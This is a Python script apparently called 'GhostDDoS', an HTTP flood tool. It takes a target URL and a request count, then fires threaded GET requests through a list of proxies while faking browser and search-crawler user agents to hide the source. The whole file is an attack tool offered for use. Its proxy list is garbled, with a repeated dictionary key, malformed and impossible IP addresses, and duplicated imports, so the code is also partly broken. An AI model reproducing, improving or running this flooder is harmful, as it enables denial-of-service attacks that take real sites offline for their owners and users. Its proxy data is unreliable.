import threading
import requests
import colorama
import getpass
import random
import threading
import requests
import smtplib
import subprocess
from colorama import Fore, Style
from colorama import Fore
import os
import colorama
import subprocess
from pystyle import Colorate, Colors
from pystyle import *
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
clear_console()
banner = '''
  ____ _               _   ____  ____       ____  
 / ___| |__   ___  ___| |_|  _ \|  _ \  ___/ ___| 
| |  _| '_ \ / _ \/ __| __| | | | | | |/ _ \___ \ 
| |_| | | | | (_) \__ \ |_| |_| | |_| | (_) |__) |
 \____|_| |_|\___/|___/\__|____/|____/ \___/____/ 
                   owner - GhostRunner
                              Ddos

'''
print(Colorate.Vertical(Colors.red_to_white,(banner)))
proxies = {
    'http': '108.181.56.101:3128',
    'http': '50.174.7.158:80',
    'http': '178.48.68.61:18080',
    'http': '50.221.230.186:80',
    'http': '50.175.212.79:80',
    'http': '131.14.186.11:80',
    'http': '251.52.111.167:8080',
    'http': '14.31.184.219:8081',
    'http': '249.10.131.39:3128',
    'http': '35.201.106.228:8080',
    'http': '189.173.175.77:8080',
    'http': '19.148.130.243:3128',
    'http': '134.8.196.162:3128',
    'http': '242.185.211.139:8080',
    'http': '208.68.206.19:8080',
    'http': '45.206.55.46:3128',
    'http': '47.123.116.237:8081',
    'http': '238.32.215.12:80',
    'http': '150.101.139.232:8080',
    'http': '103.82.251.89:80',
    'http': '187.26.235.53:3128',
    'http': '197.183.136.227:3128',
    'http': '202.123.31.215:3128',
    'http': '205.231.99.215:3128',
    'http': '226.17.38.93:8080',
    'http': '81.183.216.149:80',
    'http': '99.170.73.232:8081',
    'http': ',8.242.154.34:999', 
        'http': ',188.240.116.111:8080', 
        'http': '178.16.139.143:80',
        'http': '213.202.233.248:8089',
        'http': '103.163.227.214:3125',
        'http': '89.46.249.148:8888',
        'http': '65.108.250.159:80',
        'http': '103.103.89.85:8090',
        'http': '38.7.31.229:999',
        'http': '103.203.172.178:84',
        'http': '84.19.178.40:3128',
         'http': '14.177.235.17:8080', 
        'http': ',8.242.154.34:999', 
        'http': ',188.240.116.111:8080', 
        'http': '178.16.139.143:80',
        'http': '213.202.233.248:8089',
        'http': '103.163.227.214:3125',
        'http': '89.46.249.148:8888',
        'http': '65.108.250.159:80',
        'http': '103.103.89.85:8090',
        'http': '38.7.31.229:999',
        'http': '103.203.172.178:84',
        'http': '84.19.178.40:3128',
        'http': '62.33.207.202:80',
        'http': '5.189.184.147:27191',
        'http': '50.221.74.130:80',
        'http': '172.67.43.209:80',
        'http': '1.77.235.17:8080', 
        'http': ',854.34:999', 
        'http': ',180.116.111:8080', 
        'http': '178.139.143:80',
        'http': '213.202.233.248:8089',
        'http': '103.163.227.214:3125',
        'http': '89.46.49.148:8888',
        'http': '65.8.250.159:80',
        'http': '103103.89.85:8090',
        'http': '99.931.229:999',
        'http': '103.203.172.178:84',
        'http': '84.19.140:128',
        'http': '62.207.202:80',
        'http': '5.189.184.147:27191',
        'http': '51.74.130:80',
        'http': '17.673.209:80',
         'http': '14.177.235.17:8080', 
        'http': ',8.242.154.34:999', 
        'http': ',188.240.116.111:8080', 
        'http': '178.16.139.143:80',
        'http': '213.202.233.248:8089',
        'http': '103.163.227.214:3125',
        'http': '89.46.249.148:8888',
        'http': '65.108.250.159:80',
        'http': '103.103.89.85:8090',
        'http': '38.7.31.229:999',
        'http': '103.203.172.178:84',
        'http': '84.19.178.40:3128',
        'http': '62.33.207.202:80',
        'http': '5.189.184.147:27191',
        'http': '50.221.74.130:80',

}
url = input("[+]Enter link:")

num_requests = int(input("[+]Specify the number of requests: "))
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
                "Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{0}.0.{1}.{2} Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/{0}.0; rv:{0}.0) like Gecko",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{0}_{1}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{0}.{1}.{2} Safari/537.36",
                "Mozilla/5.0 (Linux; Android {0}.{1}; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{2}.0.{3}.{4} Mobile Safari/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS {0}_{1} like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/{2}.0 Mobile/14E5239e Safari/602.1",
                "Mozilla/5.0 (iPad; CPU OS {0}_{1} like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/{2}.0 Mobile/14E5239e Safari/602.1",
                "Opera/{0}.80 (Windows NT 10.0; Win64; x64) Presto/2.12.{1} Version/{0}.80",
                "Mozilla/5.0 (Linux; Android {0}.{1}; SM-G950F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{2}.0.{3}.{4} Mobile Safari/537.36",
                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
                "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
                "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/{0}.0.{1}.{2} Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:{0}.0) Gecko/{0}.0 Firefox/{0}.0",
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:{0}.0) Gecko/{0}.0 Firefox/{0}.0",
                "Mozilla/5.0 (Linux; Android {0}.{1}; Nexus 5 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{2}.0.{3}.{4} Mobile Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{0}.0.{1}.{2} Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{0}_{1}) AppleWebKit/601.1 (KHTML, like Gecko) Version/{2}.0 Safari/601.1",
                "Mozilla/5.0 (Windows; U; Windows NT {0}.0; en-US; rv:{1}.0) Gecko/{2} Firefox/{1}.0",
                "Mozilla/5.0 (compatible; MSIE {0}.0; Windows NT {1}.1; Trident/{2}.0)",
                "Mozilla/5.0 (Linux; Android {0}.{1}; Nexus 7 Build/JSS15Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{2}.0.{3}.{4} Mobile Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{0}_{1}) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/{2}.0 Safari/603.3.8",
                "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{0}.0.{1}.{2} Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/{0}.0; rv:{0}.0) like Gecko",
                "Mozilla/5.0 (iPad; CPU OS {0}_{1} like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/{2}.0 Mobile/15E148 Safari/604.1",
                "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/{0}.0.{1}.{2} Safari/535.1",
                "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/{0}.0.{1}.{2} Safari/535.19",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 YaBrowser/21.6.0.616 Yowser/2.5 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.135 YaBrowser/21.6.2.855 Yowser/2.5 Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 OPR/76.0.4017.177",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 OPR/77.0.4054.277",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2759.400 QQBrowser/9.6.11266.400",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:75.0) Gecko/20100101 Firefox/75.0",
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 YaBrowser/20.12.1.178 Yowser/2.5 Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Atom/4.0.0.141 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.135 YaBrowser/21.6.2.854 Yowser/2.5 Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.26 Safari/537.36 Core/1.63.5083.400 QQBrowser/10.0.972.400"
]

def send_request(i):
    user_agent = random.choice(user_agents)
    headers = {"User-Agent": user_agent}
    try:
        response = requests.get(url, headers=headers, proxies=proxies)
        print(f"[info]  {i} sent \n")
    except:
        print(f"[info] don't sent' {i}\n")

threads = []
for i in range(1, num_requests + 1):
    t = threading.Thread(target=send_request, args=[i])
    t.start()
    threads.append(t)

for t in threads:
    t.join()
